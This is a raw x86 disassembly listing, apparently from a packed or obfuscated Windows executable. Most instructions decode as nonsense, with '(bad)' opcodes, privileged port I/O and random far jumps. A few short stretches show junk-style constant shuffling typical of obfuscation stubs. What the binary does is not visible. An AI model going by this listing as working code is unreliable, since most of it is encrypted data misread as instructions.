  40617d:	dec    ebp
  40617e:	pushf  
  40617f:	sub    edi,ecx
  406181:	jmp    0x154e:0x9d943a51
  406188:	inc    esp
  406189:	shl    BYTE PTR [eax-0x2c],cl
  40618c:	pop    es
  40618d:	or     BYTE PTR ss:[ebx+0x63],ch
  406191:	xor    BYTE PTR [edx+0x7c],dh
  406194:	jmp    0xd41af17
  406199:	data16 xor cl,BYTE PTR [eax-0x5b]
  40619d:	jl     0x4061f9
  40619f:	stos   DWORD PTR es:[edi],eax
  4061a0:	mov    eax,0x667c0b83
  4061a5:	ret    
  4061a6:	dec    eax
  4061a7:	loope  0x406158
  4061a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061aa:	sbb    al,0xe9
  4061ac:	hlt    
  4061ad:	xor    esi,ebx
  4061af:	jmp    FWORD PTR [ecx]
  4061b1:	(bad)  
  4061b2:	in     eax,dx
  4061b3:	cdq    
  4061b4:	xor    BYTE PTR [esi+0x1e862856],bh
  4061ba:	push   eax
  4061bb:	fiadd  WORD PTR [ecx]
  4061bd:	push   ebp
  4061be:	ror    BYTE PTR [ebp+0x5a],cl
  4061c1:	mul    DWORD PTR [eax]
  4061c3:	aaa    
  4061c4:	add    al,0xbf
  4061c6:	adc    dh,BYTE PTR [edi+0x5a43fa2c]
  4061cc:	mov    eax,ds:0xdf9953e4
  4061d1:	xor    eax,0xc92fe040
  4061d6:	push   0x47
  4061d8:	push   es
  4061d9:	fsub   st(1),st
  4061db:	jl     0x4061f0
  4061dd:	daa    
  4061de:	in     al,0x4e
  4061e0:	cmp    al,0x9d
  4061e2:	pop    ebp
  4061e3:	push   cs
  4061e4:	sub    bl,BYTE PTR [esi+0x72]
  4061e7:	(bad)  
  4061e8:	or     esp,DWORD PTR [ebp-0x57]
  4061eb:	mov    al,0x4b
  4061ed:	inc    esi
  4061ee:	aam    0x13
  4061f0:	cli    
  4061f1:	adc    DWORD PTR [eax],ecx
  4061f3:	inc    esi
  4061f4:	adc    bh,BYTE PTR [esi]
  4061f6:	fisub  WORD PTR [edx+0x7c66752d]
  4061fc:	icebp  
  4061fd:	mov    ebp,0x3a8dedfa
  406202:	aas    
  406203:	pop    eax
  406204:	stos   DWORD PTR es:[edi],eax
  406205:	xor    eax,0x5f1403ba
  40620a:	push   es
  40620b:	cmp    BYTE PTR [edi],0xd5
  40620e:	popf   
  40620f:	out    0xe7,eax
  406211:	retf   
  406212:	sbb    dh,bh
  406214:	aad    0x64
  406216:	inc    ebp
  406217:	pop    esi
  406218:	(bad)  
  406219:	xchg   ebx,eax
  40621a:	loope  0x4061a4
  40621c:	pop    es
  40621d:	(bad)  
  40621f:	push   ebx
  406220:	xor    DWORD PTR [ecx-0xf188572],edx
  406226:	mov    al,ds:0x63fe499a
  40622b:	sub    BYTE PTR ds:0xa00f35c7,0xca
  406232:	push   cs
  406233:	pusha  
  406234:	jge    0x406243
  406236:	dec    edi
  406237:	stos   BYTE PTR es:[edi],al
  406238:	fiadd  DWORD PTR [ecx+0x47]
  40623b:	jp     0x40629b
  40623d:	rcr    dl,cl
  40623f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406240:	imul   ebx,DWORD PTR [ecx-0x5b],0xffffffac
  406244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406245:	or     bl,dl
  406247:	sbb    BYTE PTR [esi+0x43],ch
  40624a:	adc    al,0xce
  40624c:	icebp  
  40624d:	jl     0x4061fa
  40624f:	lock and ecx,ebp
  406252:	mov    edx,ecx
  406254:	mov    ds:0x2726feab,eax
  406259:	andps  xmm0,XMMWORD PTR [ebx]
  40625c:	stc    
  40625d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40625e:	xor    eax,DWORD PTR [ebx+0x598045fc]
  406264:	iret   
  406265:	mov    bl,cl
  406267:	xor    BYTE PTR [ebx],dh
  406269:	mov    eax,ds:0xa1b89ce0
  40626e:	sub    ebx,0xd9db8bed
  406274:	test   eax,0x4e95cd2f
  406279:	ds jne 0x4062a0
  40627c:	enter  0x7d0,0xaf
  406280:	push   0x772557f0
  406285:	in     al,0x41
  406287:	push   esp
  406288:	daa    
  406289:	xor    dl,BYTE PTR [eax]
  40628b:	push   ebp
  40628c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40628d:	out    0x5f,al
  40628f:	inc    ecx
  406290:	mov    dl,0x4e
  406292:	je     0x4062eb
  406294:	cmc    
  406295:	jp     0x406303
  406297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406298:	dec    esp
  406299:	mov    ecx,0x9e52588
  40629e:	stc    
  40629f:	bound  ecx,QWORD PTR [ebp-0x4304b77e]
  4062a5:	and    dl,bl
  4062a7:	test   BYTE PTR [esi+0x7996cf07],al
  4062ad:	enter  0x5762,0xe9
  4062b1:	scas   eax,DWORD PTR es:[edi]
  4062b2:	ins    BYTE PTR es:[edi],dx
  4062b3:	in     eax,dx
  4062b4:	mov    edx,0x9c85458d
  4062b9:	mov    cl,0x85
  4062bb:	fild   QWORD PTR [eax+0x24]
  4062be:	cmp    ecx,eax
  4062c0:	mov    ebx,0x34499272
  4062c5:	test   eax,0xfb8823c5
  4062ca:	ror    BYTE PTR [edx-0x54214517],cl
  4062d0:	add    ah,BYTE PTR ds:0xde7e6ce8
  4062d6:	xchg   edi,eax
  4062d7:	iret   
  4062d8:	or     eax,0xd417194a
  4062dd:	retf   
  4062de:	mov    esp,0x9a8b11fc
  4062e3:	or     ebp,DWORD PTR [ebp+0x7d]
  4062e6:	mov    bh,0xec
  4062e8:	shr    eax,cl
  4062ea:	out    0xdc,eax
  4062ec:	cmp    eax,0x367f10ea
  4062f1:	and    edx,DWORD PTR [ecx+0x270cea73]
  4062f7:	or     al,0x4
  4062f9:	cmp    BYTE PTR [ebx],0x76
  4062fc:	lahf   
  4062fd:	pop    edx
  4062fe:	fnstsw ax
  406300:	daa    
  406301:	push   eax
  406302:	pushf  
  406303:	xchg   edx,eax
  406304:	mov    al,ds:0x17148809
  406309:	push   ebp
  40630a:	shr    BYTE PTR [edi],0xdc
  40630d:	(bad)
  406310:	xor    al,0xec
  406312:	xor    DWORD PTR [eax+0x15b33599],esp
  406318:	ss jl  0x4062d2
  40631b:	mov    esp,0xae0df9dd
  406320:	jmp    0x406337
  406322:	int3   
  406323:	ficomp WORD PTR [esi+0x6c08638f]
  406329:	pop    ecx
  40632a:	mov    dh,0xb7
  40632c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40632e:	mov    esi,0xa744fe92
  406333:	mov    ds:0xbcaf65fe,eax
  406338:	and    BYTE PTR [ebx],ch
  40633a:	dec    esi
  40633b:	sub    ecx,DWORD PTR [ecx+ebx*8]
  40633e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40633f:	mov    cl,0x36
  406341:	int3   
  406342:	and    dh,bl
  406344:	and    al,0x2e
  406346:	xchg   ebx,eax
  406347:	stos   DWORD PTR es:[edi],eax
  406348:	daa    
  406349:	pop    ds
  40634a:	mov    edi,0x30ea7e34
  40634f:	ins    BYTE PTR es:[edi],dx
  406350:	and    esp,DWORD PTR es:[edx]
  406353:	jmp    0x40636b
  406355:	xchg   edx,eax
  406356:	stos   DWORD PTR es:[edi],eax
  406357:	jo     0x406342
  406359:	(bad)  
  40635a:	jne    0x4062de
  40635c:	pushf  
  40635d:	jno    0x406353
  40635f:	push   esp
  406360:	out    0x99,al
  406362:	push   0xffffffdd
  406364:	inc    DWORD PTR [ebx-0x36]
  406367:	sub    eax,0x18a95c2e
  40636c:	cmp    BYTE PTR [ebx-0xcb8b52f],ch
  406372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406373:	out    dx,al
  406374:	aas    
  406375:	imul   esp,edx,0x1c
  406378:	sbb    dh,cl
  40637a:	ja     0x4063dd
  40637c:	mov    eax,ds:0xf74a3f74
  406381:	test   eax,0x1cdc8be1
  406386:	dec    esi
  406387:	cwde   
  406388:	retf   
  406389:	pusha  
  40638a:	icebp  
  40638b:	repnz out 0xa5,eax
  40638e:	inc    esp
  40638f:	jecxz  0x406366
  406391:	repz clc 
  406393:	fbstp  TBYTE PTR [edi]
  406395:	sbb    DWORD PTR [esi],edx
  406397:	in     al,0xee
  406399:	dec    esp
  40639a:	aad    0xfa
  40639c:	repnz inc esp
  40639e:	mov    ss,ebp
  4063a0:	adc    edx,DWORD PTR [ebx*8+0x785b4459]
  4063a7:	mov    edx,0x176d5ae4
  4063ac:	and    ah,0x9d
  4063af:	cmp    DWORD PTR [ebx+0x488d20ff],ecx
  4063b5:	and    eax,0x47bb7f90
  4063ba:	sar    DWORD PTR [edi-0x79e277ae],1
  4063c0:	add    edx,esi
  4063c2:	mov    bh,0x91
  4063c4:	push   esp
  4063c5:	and    al,0x2c
  4063c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063c8:	inc    esp
  4063c9:	out    0x64,eax
  4063cb:	std    
  4063cc:	inc    ecx
  4063cd:	push   es
  4063ce:	mov    BYTE PTR ds:0xc9f17f72,bh
  4063d4:	in     al,0x8b
  4063d6:	cmp    BYTE PTR [esi],ch
  4063d8:	and    al,0xfc
  4063da:	push   eax
  4063db:	stos   DWORD PTR es:[edi],eax
  4063dc:	add    eax,0x1999997b
  4063e1:	mov    esp,DWORD PTR [ebx]
  4063e3:	dec    ecx
  4063e4:	(bad)  
  4063e5:	sub    eax,ebx
  4063e7:	imul   ecx,ebx,0xc371bf96
  4063ed:	add    cl,bh
  4063ef:	add    DWORD PTR [esp+eax*4+0xddc8426],0xf
  4063f7:	pop    ds
  4063f8:	push   esi
  4063f9:	and    dh,BYTE PTR [esp+edx*1-0x29]
  4063fd:	xor    ch,bl
  4063ff:	xrelease mov DWORD PTR [edx],esp
  406402:	adc    eax,0xb5f7594e
  406407:	stos   DWORD PTR es:[edi],eax
  406408:	imul   ecx,DWORD PTR [eax+edi*2-0x41],0x4e8daa78
  406410:	xchg   dl,cl
  406412:	imul   eax,DWORD PTR [edi+0x78025b2c],0x1c
  406419:	ds imul eax,ebx,0x163647f2
  406420:	cmc    
  406421:	jbe    0x405c26
  406427:	pop    ebx
  406428:	mov    eax,0xf89c8532
  40642d:	pop    edi
  40642e:	pop    esi
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430486,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e762
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430492
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4304b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ee0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e762,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e75a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x507513d0]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	retf   
  4064ae:	fist   WORD PTR [ecx+0x73812313]
  4064b4:	push   cs
  4064b5:	outs   dx,BYTE PTR ds:[esi]
  4064b6:	inc    ebx
  4064b7:	and    edi,edi
  4064b9:	cwde   
  4064ba:	ja     0x406457
  4064bc:	inc    ebp
  4064bd:	ins    BYTE PTR es:[edi],dx
  4064be:	and    al,BYTE PTR [ebx+0x66f47074]
  4064c4:	xchg   ebx,eax
  4064c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064c6:	(bad)  
  4064c8:	test   al,0xf6
  4064ca:	dec    esi
  4064cb:	xchg   edx,eax
  4064cc:	arpl   WORD PTR [ebx-0x50],bx
  4064cf:	(bad)  
  4064d0:	pop    esp
  4064d1:	push   0xffffffb6
  4064d3:	push   DWORD PTR [eax]
  4064d5:	stos   DWORD PTR es:[edi],eax
  4064d6:	dec    ebp
  4064d7:	popa   
  4064d8:	sar    BYTE PTR [ecx+0x64c638c6],0x2d
  4064df:	and    eax,DWORD PTR [edx]
  4064e1:	mov    DWORD PTR [edi],esi
  4064e3:	or     al,0x5f
  4064e5:	fist   DWORD PTR [ebx-0x3a0ece77]
  4064eb:	sti    
  4064ec:	dec    eax
  4064ed:	xor    ah,BYTE PTR [ebp-0x2646f543]
  4064f3:	ds push ecx
  4064f5:	in     eax,0x67
  4064f7:	sub    al,0x39
  4064f9:	adc    ah,BYTE PTR [ebp-0x72cb21a2]
  4064ff:	fbstp  TBYTE PTR [ecx]
  406501:	push   ecx
  406502:	mov    DWORD PTR [ecx],edx
  406504:	xchg   DWORD PTR [edi+0x5ddeb2a],edx
  40650a:	sub    DWORD PTR [edi],esi
  40650c:	and    BYTE PTR [ebx],dh
  40650e:	scas   al,BYTE PTR es:[edi]
  40650f:	add    DWORD PTR [edx-0x5b25b392],ebx
  406515:	xor    bh,ah
  406517:	lods   eax,DWORD PTR ds:[esi]
  406518:	aad    0xb5
  40651a:	or     BYTE PTR ds:0x1d01ed71,dh
  406520:	stos   BYTE PTR es:[edi],al
  406521:	mov    WORD PTR [edi],fs
  406523:	fistp  WORD PTR [ebx]
  406525:	sub    DWORD PTR [ebx-0x4e],esp
  406528:	xchg   ebp,eax
  406529:	adc    BYTE PTR [eax-0x7fbce83b],cl
  40652f:	mov    ds:0x5568d4b8,eax
  406534:	das    
  406535:	xchg   DWORD PTR [eax-0x72d19d6b],eax
  40653b:	(bad)  
  40653c:	push   ds
  40653d:	mov    al,0x8b
  40653f:	daa    
  406540:	and    eax,0xf1a9a89a
  406545:	cmp    BYTE PTR [ebx-0x7f],ch
  406548:	mov    WORD PTR cs:[ebp-0x53],fs
  40654c:	(bad)  
  40654d:	out    dx,eax
  40654e:	and    BYTE PTR [eax],al
  406550:	out    dx,eax
  406551:	std    
  406552:	mov    BYTE PTR [ebx+0x6b2025f3],dl
  406558:	or     BYTE PTR [edi-0x75cbd55a],0x15
  40655f:	mov    dh,0x47
  406561:	neg    BYTE PTR [esi-0x6a]
  406564:	push   cs
  406565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406566:	lods   eax,DWORD PTR ds:[esi]
  406567:	sbb    BYTE PTR [eax+0x32135de6],bh
  40656d:	and    al,0x83
  40656f:	aaa    
  406570:	push   0x8
  406572:	mov    al,ds:0x329c56b7
  406577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406578:	ret    
  406579:	mov    ds:0x73ad82cd,eax
  40657e:	jae    0x406523
  406580:	xchg   esp,eax
  406581:	(bad)
  406584:	and    eax,0x59ac07a
  406589:	jo     0x406585
  40658b:	cld    
  40658c:	or     esp,DWORD PTR [eax+0x6418a1fa]
  406592:	je     0x4065b0
  406594:	xchg   edx,eax
  406595:	arpl   WORD PTR [edx-0x28ae1161],si
  40659b:	stos   DWORD PTR es:[edi],eax
  40659c:	cdq    
  40659d:	fwait
  40659e:	sbb    DWORD PTR [ecx+ebx*8],0x6b
  4065a2:	add    al,0x93
  4065a4:	mov    sp,WORD PTR [ebp+0x38]
  4065a8:	outs   dx,BYTE PTR ds:[esi]
  4065a9:	(bad)  [esi+edx*2-0x36b92c6d]
  4065b0:	std    
  4065b1:	or     DWORD PTR [eax-0x3ab82e03],0x6e
  4065b8:	in     eax,dx
  4065b9:	mov    edx,0x5dd5e567
  4065be:	mov    eax,0xacd84091
  4065c3:	add    eax,0x3ddde9d2
  4065c8:	icebp  
  4065c9:	jecxz  0x406622
  4065cb:	into   
  4065cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065cd:	ins    DWORD PTR es:[edi],dx
  4065ce:	enter  0x684f,0xbc
  4065d2:	ss add edx,ebx
  4065d5:	addr16 in eax,dx
  4065d7:	sub    al,0x71
  4065d9:	sbb    al,0x3a
  4065db:	iret   
  4065dc:	pop    edx
  4065dd:	lods   al,BYTE PTR ds:[esi]
  4065de:	addr16 inc esi
  4065e0:	mov    eax,ds:0x4b48d70f
  4065e5:	sub    al,0xf7
  4065e7:	mov    bh,dh
  4065e9:	out    0x9b,eax
  4065eb:	add    al,0xc5
  4065ed:	mov    BYTE PTR [ecx+esi*1-0x1d9929be],bh
  4065f4:	dec    edx
  4065f5:	std    
  4065f6:	push   0xf6a54870
  4065fb:	pusha  
  4065fc:	mov    bl,0x77
  4065fe:	sub    BYTE PTR [edx],dh
  406600:	not    DWORD PTR [ebp-0x35]
  406603:	jge    0x4065a2
  406605:	repnz xchg edx,eax
  406607:	cmp    eax,ecx
  406609:	popf   
  40660a:	adc    eax,0x532e883
  40660f:	ja     0x406621
  406611:	mov    ah,BYTE PTR [ebp-0x59]
  406614:	je     0x4065a4
  406616:	fcomp  QWORD PTR [edx-0x46]
  406619:	cmp    DWORD PTR [eax+0xd],eax
  40661c:	(bad)  
  40661d:	ror    DWORD PTR [ecx-0x254f8252],cl
  406623:	inc    ebx
  406624:	ror    DWORD PTR [ebx],1
  406626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406627:	scas   al,BYTE PTR es:[edi]
  406628:	jmp    0x74ee:0x39ff6e08
  40662f:	jle    0x406695
  406631:	mov    dl,0x38
  406633:	test   DWORD PTR fs:[edi+eax*4+0x19],0x9791938b
  40663c:	cdq    
  40663d:	pop    edx
  40663e:	fwait
  40663f:	pop    ecx
  406640:	jl     0x4065eb
  406642:	cli    
  406643:	nop
  406644:	out    dx,al
  406645:	fild   DWORD PTR [ebx]
  406647:	fdiv   DWORD PTR [ebp+0x6c]
  40664a:	mov    esp,0x86dcb875
  40664f:	repnz mov ds:0xf99b60dd,eax
  406655:	(bad)  
  406656:	cmp    ebp,esi
  406658:	jns    0x4066ce
  40665a:	lods   al,BYTE PTR ds:[esi]
  40665b:	xlat   BYTE PTR ds:[ebx]
  40665c:	add    al,0x91
  40665e:	mov    eax,ds:0x6debea0f
  406663:	mov    edx,DWORD PTR [ebp-0x45f7d3e9]
  406669:	fadd   st(1),st
  40666b:	mov    eax,ds:0xb7f9a9e4
  406670:	lahf   
  406671:	push   edx
  406672:	lods   al,BYTE PTR ds:[esi]
  406673:	jecxz  0x40664b
  406675:	in     al,0xf3
  406677:	fcom   QWORD PTR [ebx+0x67bb1224]
  40667d:	repnz push eax
  40667f:	jge    0x406628
  406681:	fdivr  DWORD PTR [edi-0x4d]
  406684:	(bad)  
  406685:	dec    DWORD PTR [edx+0x57]
  406688:	imul   edx,ebp,0xeeeb962b
  40668e:	or     eax,0x9bee09b6
  406693:	add    ah,BYTE PTR [edx]
  406695:	cmp    al,al
  406697:	or     BYTE PTR [esi+0x37e5ae07],0x2
  40669e:	push   ebx
  40669f:	inc    edi
  4066a0:	fist   DWORD PTR [esi]
  4066a2:	cwde   
  4066a3:	ss add eax,0x1c9288c0
  4066a9:	sub    ch,ah
  4066ab:	dec    esp
  4066ac:	int3   
  4066ad:	leave  
  4066ae:	fstp   TBYTE PTR [ebp+0x3c]
  4066b1:	fxch   st(1)
  4066b3:	stc    
  4066b4:	clc    
  4066b5:	fld    DWORD PTR [edi]
  4066b7:	jno    0x4066ec
  4066b9:	inc    eax
  4066ba:	test   eax,0x5ddc0e35
  4066bf:	fdiv   DWORD PTR ds:0xaae85c62
  4066c5:	mov    bh,0x32
  4066c7:	jae    0x4066e9
  4066c9:	imul   edi,ebx,0x7366ac0c
  4066cf:	fs pusha 
  4066d1:	out    0xa,al
  4066d3:	cdq    
  4066d4:	xchg   esp,eax
  4066d5:	push   0xab6b31a5
  4066da:	push   ds
  4066db:	jge    0x4066f2
  4066dd:	mov    eax,0x8c6e08df
  4066e2:	mov    cl,0x30
  4066e4:	pop    ds
  4066e5:	sbb    DWORD PTR ds:0x68ad8b9,esi
  4066eb:	mov    ah,0x64
  4066ed:	add    al,0x65
  4066ef:	lahf   
  4066f0:	icebp  
  4066f1:	jl     0x40667d
  4066f3:	aam    0x0
  4066f5:	imul   ebp,DWORD PTR [ebx-0x1c7a5df4],0x73
  4066fc:	mov    esp,0x3fbd56a1
  406701:	scas   eax,DWORD PTR es:[edi]
  406702:	loopne 0x40671d
  406704:	push   0xfffffff7
  406706:	sbb    dl,BYTE PTR [ecx]
  406708:	cs in  eax,dx
  40670a:	into   
  40670b:	imul   ecx,DWORD PTR [eax-0x66810721],0xb11c1998
  406715:	jecxz  0x406787
  406717:	inc    ebp
  406718:	add    BYTE PTR [edi],0xd7
  40671b:	loope  0x406767
  40671d:	mov    ebx,0x42250d73
  406722:	push   ebp
  406723:	or     al,0x49
  406725:	les    esp,FWORD PTR [edx-0x39d565bb]
  40672b:	dec    ax
  40672d:	mov    esi,0xd7f2e95f
  406732:	out    0xc8,al
  406734:	cmp    eax,edx
  406736:	add    bh,cl
  406738:	adc    eax,0xd18bc6aa
  40673d:	sbb    al,0xa8
  40673f:	and    dh,cl
  406741:	icebp  
  406742:	sbb    DWORD PTR [ebp-0x2efd954a],edi
  406748:	cmp    BYTE PTR [edi-0x1a],0xd6
  40674c:	or     BYTE PTR [edi+0x356f8e64],al
  406752:	adc    eax,0xc65821a5
  406757:	outs   dx,BYTE PTR ds:[esi]
  406758:	aas    
  406759:	push   edx
  40675a:	test   eax,0xae99752a
  40675f:	loop   0x4066ff
  406761:	mov    ebx,0xad2b7cbd
  406766:	sbb    DWORD PTR [edx],esi
  406768:	inc    esi
  406769:	in     eax,0x52
  40676b:	mov    bh,BYTE PTR [ecx+0xa29079d]
  406771:	neg    BYTE PTR [edi+0x19174203]
  406777:	cmp    dl,BYTE PTR [ebx-0x7c]
  40677a:	mov    edi,0x25ab7b5b
  40677f:	loop   0x4067c6
  406781:	push   esp
  406782:	sub    dl,BYTE PTR [eax-0x14]
  406785:	sbb    dl,BYTE PTR [esi+ebp*2-0x22]
  406789:	ret    
  40678a:	and    al,0xe7
  40678c:	fisttp QWORD PTR [edi+0x6f662d6b]
  406792:	stc    
  406793:	adc    eax,ebx
  406795:	icebp  
  406796:	les    edi,FWORD PTR cs:[esi]
  406799:	js     0x4067cf
  40679b:	or     cl,ah
  40679d:	call   DWORD PTR [ebp-0x4b6c3160]
  4067a3:	test   al,0x4f
  4067a5:	pop    ds
  4067a6:	stc    
  4067a7:	or     BYTE PTR [ecx],dl
  4067a9:	std    
  4067aa:	push   0x76935cca
  4067af:	cmp    al,0x81
  4067b1:	mov    bh,0x75
  4067b3:	(bad)  
  4067b4:	shl    BYTE PTR [ebp+esi*4+0x7951c5d3],1
  4067bb:	cmp    BYTE PTR [edx+0x45914bc9],bh
  4067c1:	pop    esp
  4067c2:	stc    
  4067c3:	cli    
  4067c4:	inc    ecx
  4067c5:	(bad)  
  4067c6:	stos   DWORD PTR es:[edi],eax
  4067c7:	push   ecx
  4067c8:	mov    ebx,0xfc2211a
  4067cd:	adc    al,0xe0
  4067cf:	dec    edi
  4067d0:	sub    al,0x31
  4067d2:	add    DWORD PTR [edx+0x77],eax
  4067d5:	sub    dl,BYTE PTR [ebp-0x60]
  4067d8:	sahf   
  4067d9:	cdq    
  4067da:	lahf   
  4067db:	imul   esp,DWORD PTR [ecx+0x3452c9ce],0x518f9b3e
  4067e5:	mov    edi,ebp
  4067e7:	mov    ecx,0x99f05731
  4067ec:	stc    
  4067ed:	jb     0x4067b3
  4067ef:	jle    0x406796
  4067f1:	stos   BYTE PTR es:[edi],al
  4067f2:	mov    ah,0x19
  4067f4:	loopne 0x406794
  4067f6:	scas   eax,DWORD PTR es:[edi]
  4067f7:	pop    eax
  4067f8:	loop   0x406787
  4067fa:	(bad)  
  4067fb:	in     eax,dx
  4067fc:	or     al,cl
  4067fe:	fild   QWORD PTR [ecx+0x7e78984e]
  406804:	scas   al,BYTE PTR es:[edi]
  406805:	adc    BYTE PTR [edi+0x20],dh
  406808:	xchg   esp,eax
  406809:	ficomp DWORD PTR [ebp-0x3e]
  40680c:	jp     0x4067a9
  40680e:	jmp    0xf95b3ffe
  406813:	scas   eax,DWORD PTR es:[edi]
  406814:	fld    st(1)
  406816:	cld    
  406817:	fdivr  QWORD PTR [ebp+0xc758be1]
  40681d:	sbb    DWORD PTR ds:0x42ee24,0x4304aa
  406827:	sub    eax,edx
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x430552,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ee1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43053e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4304ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430556,0x43049a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ee24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	lods   eax,DWORD PTR ds:[esi]
  406894:	sbb    eax,DWORD PTR [eax+0x7e364b93]
  40689a:	jle    0x406887
  40689c:	jno    0x40691c
  40689e:	jle    0x40685e
  4068a0:	mov    edi,0xcbe95e5d
  4068a5:	icebp  
  4068a6:	cld    
  4068a7:	or     al,0xf4
  4068a9:	cmp    bh,BYTE PTR [ebx]
  4068ab:	call   0xbf764eb1
  4068b0:	mov    dh,0x1f
  4068b2:	outs   dx,BYTE PTR ds:[esi]
  4068b3:	fs push ebx
  4068b5:	stc    
  4068b6:	jmp    FWORD PTR [eax+0x77]
  4068b9:	ss stos BYTE PTR es:[edi],al
  4068bb:	or     eax,0xabb9f044
  4068c0:	lds    ecx,FWORD PTR [eax]
  4068c2:	icebp  
  4068c3:	cmp    al,0xb8
  4068c5:	add    DWORD PTR [edi*8+0x36501dd2],eax
  4068cc:	jb     0x406886
  4068ce:	fs ret 
  4068d0:	and    edi,ebx
  4068d2:	sbb    esi,ebx
  4068d4:	std    
  4068d5:	jbe    0x406951
  4068d7:	ss jbe 0x4068d3
  4068da:	clc    
  4068db:	or     ah,bl
  4068dd:	lods   eax,DWORD PTR ds:[esi]
  4068de:	and    eax,0xb4cabee9
  4068e3:	add    dl,bh
  4068e5:	addr16 mov ds:0x576,al
  4068ea:	cs mov bh,0xf8
  4068ed:	and    esi,ecx
  4068ef:	add    eax,0xcf4cdd5f
  4068f4:	pop    esp
  4068f5:	fcmovnu st,st(7)
  4068f7:	int3   
  4068f8:	(bad)  
  4068f9:	jne    0x406896
  4068fb:	fild   WORD PTR [ebx]
  4068fd:	add    al,0x34
  4068ff:	cs call 0xa5b5:0xe15342c
  406907:	iret   
  406908:	adc    BYTE PTR [ebx-0x59d6a2de],al
  40690e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40690f:	or     BYTE PTR [ebx-0x40],ch
  406912:	std    
  406913:	dec    ebx
  406914:	mov    ds:0xc846d184,al
  406919:	addr16 std 
  40691b:	mov    dl,0xc4
  40691d:	xlat   BYTE PTR ds:[ebx]
  40691e:	inc    ebx
  40691f:	mov    eax,ebx
  406921:	mov    ds:0x59d84c27,eax
  406926:	sbb    BYTE PTR [eax],bh
  406928:	lods   al,BYTE PTR ds:[esi]
  406929:	jle    0x406907
  40692b:	dec    ebx
  40692c:	push   edi
  40692d:	adc    bl,ah
  40692f:	jl     0x4068ce
  406931:	in     al,0x2f
  406933:	icebp  
  406934:	xor    ch,dh
  406936:	das    
  406937:	sahf   
  406938:	dec    ebx
  406939:	stos   BYTE PTR es:[edi],al
  40693a:	xchg   DWORD PTR [ecx+0x33],ebx
  40693d:	cmp    ah,BYTE PTR [edi+eax*8+0x3e]
  406941:	daa    
  406942:	mov    dl,BYTE PTR [edi-0x65047d94]
  406948:	and    esi,DWORD PTR ds:0x4fed1a46
  40694e:	jo     0x406952
  406950:	iret   
  406951:	scas   al,BYTE PTR es:[edi]
  406952:	psrlw  mm7,QWORD PTR [edx+0x7a7957a2]
  406959:	test   eax,0xcda12833
  40695e:	dec    esp
  40695f:	and    ebx,DWORD PTR [ebp+0xafdf7ff]
  406965:	pop    eax
  406966:	mov    ss,WORD PTR [di+0x34]
  40696a:	add    DWORD PTR [ecx],eax
  40696c:	(bad)  
  40696d:	cld    
  40696e:	mov    ebp,0x760f6b48
  406973:	and    esp,edx
  406975:	in     eax,dx
  406976:	xchg   edi,eax
  406977:	fnstcw WORD PTR [ebx-0x60]
  40697a:	fsub   QWORD PTR [eax]
  40697c:	adc    dl,BYTE PTR [ecx-0x52]
  40697f:	int    0x7b
  406981:	das    
  406982:	adc    BYTE PTR [eax+0x241ca4d2],0x7e
  406989:	mov    eax,0x4b08da6e
  40698e:	(bad)  
  40698f:	fs mov dl,0xed
  406992:	in     eax,dx
  406993:	addr16 retf 
  406995:	pop    ecx
  406996:	push   ebx
  406997:	(bad)  
  406998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406999:	out    0x74,al
  40699b:	add    eax,0x2126d4a1
  4069a0:	sti    
  4069a1:	sbb    ah,BYTE PTR [ecx]
  4069a3:	xor    ah,BYTE PTR [ebp-0x5151409b]
  4069a9:	cmp    BYTE PTR [ecx*1+0x30c84316],dh
